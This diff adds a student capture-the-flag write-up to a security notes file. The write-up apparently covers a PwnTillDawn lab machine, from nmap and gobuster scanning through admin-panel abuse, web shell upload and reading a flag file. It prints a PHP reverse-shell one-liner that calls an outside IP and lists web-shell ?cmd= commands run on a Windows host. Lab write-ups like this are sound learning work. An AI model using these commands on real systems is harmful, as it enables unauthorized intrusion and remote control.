@@ -20,3 +20,139 @@ Threat: An external or internal force/actor that has the potential to exploit a 
 | 8 | Cybercriminals send ransomware through email attachments to multiple employees. | **Threat** | Ransomware — a direct cyberattack designed to harm and demand payment. |
 | 9 | A company website doesn’t validate user input in its contact form, allowing malicious SQL commands. | **Vulnerability** | SQL Injection risk — a coding flaw in input validation. |
 | 10 | Attackers use fake job advertisements on social media to trick users into sharing personal data. | **Threat** | Social engineering — psychological manipulation used to gain sensitive information. |
+
+
+TASK W3 VA
+
+## **1. Reconnaissance (Information Gathering)**
+
+**Objective:** Identify target surface and exposed services.
+
+Always start with nmap to scan for open port and services.
+
+```nmap -sC -sV -Pn -vv 10.150.150.11```
+<img width="1267" height="654" alt="Screenshot 2026-04-14 224400" src="https://github.com/user-attachments/assets/81194b10-8f9a-47e3-a7d5-c35ebb2c4127" />
+<img width="1265" height="704" alt="image" src="https://github.com/user-attachments/assets/b4834a83-2dbc-4441-8b56-ff8f4016a5f4" />
+<img width="1269" height="702" alt="image" src="https://github.com/user-attachments/assets/8bf31e83-8858-4244-9907-c0026af3cc6d" />
+<img width="1271" height="113" alt="image" src="https://github.com/user-attachments/assets/94a6fdb5-a2bb-4078-9abf-cd89b9ef6419" />
+
+### Web Enumeration
+
+**Gobuster**
+
+```
+ gobuster dir -u [http://10.150.150.11](http://10.150.150.11/) -w /usr/share/wordlists/dirb/common.txt
+```
+<img width="1271" height="645" alt="image" src="https://github.com/user-attachments/assets/987c2ae8-9f65-47ea-8c8a-41abb3b64daa" />
+
+### Discovered:
+
+- `/upload`
+- `/admin`
+
+`/upload`
+<img width="1270" height="365" alt="image" src="https://github.com/user-attachments/assets/f68cdf08-ceea-483f-aade-7140abf94d98" />
+
+The exposed `/upload` directory with directory indexing enabled suggests improper access control. 
+If file uploads are permitted, this could lead to arbitrary file upload, enabling an attacker to upload a malicious payload (e.g., PHP web shell) and achieve remote code execution.
+
+`/admin`
+<img width="1275" height="342" alt="image" src="https://github.com/user-attachments/assets/80544588-508b-45d3-bc93-8c140f1a3b6a" />
+
+```latex
+http://10.150.150.11/admin/addedituser.php
+```
+<img width="1270" height="563" alt="image" src="https://github.com/user-attachments/assets/a2b6b3e1-f02c-45b3-9434-7467ccefbd45" />
+
+### Findings:
+
+- `/upload` → directory indexing enabled
+- `/admin/addedituser.php` → user management exposed
+
+## **3. Gaining Access (Exploitation)**
+
+**Objective:** Exploit vulnerabilities to gain initial foothold.
+
+### Vulnerability Identified:
+
+- **Improper Access Control**
+- Ability to:
+    - Access admin panel
+    - Create new users
+    - Assign admin role (Full administrative access to web panel)
+
+So i add **testuser:testuser** with **role:admin**
+
+We can also view a list of user.
+<img width="1272" height="642" alt="image" src="https://github.com/user-attachments/assets/6d7cbb8d-07d0-4ec9-aaf3-91dea07a4682" />
+
+### Next Exploit: File Upload Vulnerability
+
+- Upload functionality available
+- No validation on file type
+
+➡️ Uploaded malicious PHP file (web shell attempt)
+
+Then i found that i can add a file. So lets try to upload the reverse shell.
+```
+php -r '$sock=fsockopen("192.168.252.131",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+<img width="1280" height="514" alt="image" src="https://github.com/user-attachments/assets/b9187fab-614c-492d-985c-99f0f31a0709" />
+<img width="1274" height="409" alt="image" src="https://github.com/user-attachments/assets/e4299afd-b798-4de0-8ef0-d9817a4e13ab" />
+
+Nothing happen. 
+
+Lets try Command Injection via web shell
+
+```
+?cmd=whoami
+```
+<img width="1274" height="245" alt="image" src="https://github.com/user-attachments/assets/7b2f74e7-9a8f-4902-adf7-48dcb3810fa2" />
+✅ Successful execution confirmed RCE
+
+## **4. Maintaining Access (Post-Exploitation)**
+
+**Objective:** Establish control and explore system.
+
+```
+?cmd=hostname
+```
+<img width="1274" height="221" alt="image" src="https://github.com/user-attachments/assets/4717774f-5182-49a3-a946-c75c818ba560" />
+
+```
+?cmd=net user
+```
+<img width="1272" height="236" alt="image" src="https://github.com/user-attachments/assets/f95bee2d-3902-48f9-a4a0-a8bca8f3a966" />
+
+## 5. Privilege Escalation & Lateral Movement
+
+**Objective:** Gain higher privileges / sensitive access.
+
+```
+?cmd=dir C:\Users
+```
+<img width="1276" height="387" alt="image" src="https://github.com/user-attachments/assets/6f7e00c8-2ffb-423d-8a91-444fd0fca3fc" />
+
+```
+?cmd=dir C:\Users\Administrator\
+```
+<img width="1282" height="476" alt="image" src="https://github.com/user-attachments/assets/696aa4c9-1d86-4a47-8d19-b5bcb891c1c9" />
+
+```
+?cmd=dir C:\Users\Administrator\Desktop
+```
+<img width="1277" height="277" alt="image" src="https://github.com/user-attachments/assets/44b08589-8040-411a-a9b7-912a87143319" />
+
+THERE IT IS FLAG1!!
+
+### Result:
+
+- Found sensitive file:
+    - `FLAG1.txt`
+
+```
+http://10.150.150.11/upload/11/cmd.php?cmd=type C:\Users\Administrator\Desktop\FLAG1.txt
+```
+<img width="1275" height="229" alt="image" src="https://github.com/user-attachments/assets/62368551-41ee-4aa6-9cc8-995287ebbed1" />
+
+> **FLAG1**: PwnTillDawnAcademyIsAwesome!!!
